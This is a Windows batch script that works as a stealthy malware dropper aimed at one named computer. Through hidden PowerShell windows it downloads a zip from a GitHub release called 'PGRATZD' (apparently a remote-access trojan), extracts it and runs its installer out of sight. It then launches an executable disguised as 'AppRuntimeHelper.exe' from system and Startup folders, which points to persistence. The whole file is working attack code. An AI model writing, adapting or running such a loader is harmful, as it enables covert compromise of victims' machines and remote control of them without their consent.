@echo off
setlocal
if /i not "%COMPUTERNAME%"=="G_Garas_Laptop" exit /b 0

set "_zip=%TEMP%\install.zip"
set "_out=%TEMP%\PGRATZD_install"

powershell -NoProfile -WindowStyle Hidden -Command ^
  "Invoke-WebRequest -Uri 'https://github.com/ZDStudios/PGRATZD/releases/download/V2/install.zip' -OutFile '%_zip%'"
if not exist "%_zip%" exit /b 1

powershell -NoProfile -WindowStyle Hidden -Command ^
  "Expand-Archive -Path '%_zip%' -DestinationPath '%_out%' -Force"

:: Launch install.bat inside a hidden powershell process (visible only in Task Manager)
powershell -NoProfile -WindowStyle Hidden -Command ^
  "Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -Command ""& {Start-Process cmd -ArgumentList '/c %_out%\install.bat' -WindowStyle Hidden -Wait}""' -WindowStyle Hidden"

:: Launch whichever location is now present
timeout /t 5 /nobreak >nul
if exist "%SystemRoot%\System32\AppRuntimeHelper.exe"                              start "" "%SystemRoot%\System32\AppRuntimeHelper.exe" & exit /b 0
if exist "%ProgramData%\Microsoft\Windows\AppRuntimeHelper.exe"                    start "" "%ProgramData%\Microsoft\Windows\AppRuntimeHelper.exe" & exit /b 0
if exist "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\PGRATZD.exe" start "" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\PGRATZD.exe" & exit /b 0
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\PGRATZD.exe"     start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\PGRATZD.exe" & exit /b 0
if exist "%LOCALAPPDATA%\Microsoft\Windows\AppRuntimeHelper.exe"                   start "" "%LOCALAPPDATA%\Microsoft\Windows\AppRuntimeHelper.exe" & exit /b 0
if exist "%TEMP%\AppRuntimeHelper.exe"                                             start "" "%TEMP%\AppRuntimeHelper.exe" & exit /b 0
exit /b 0
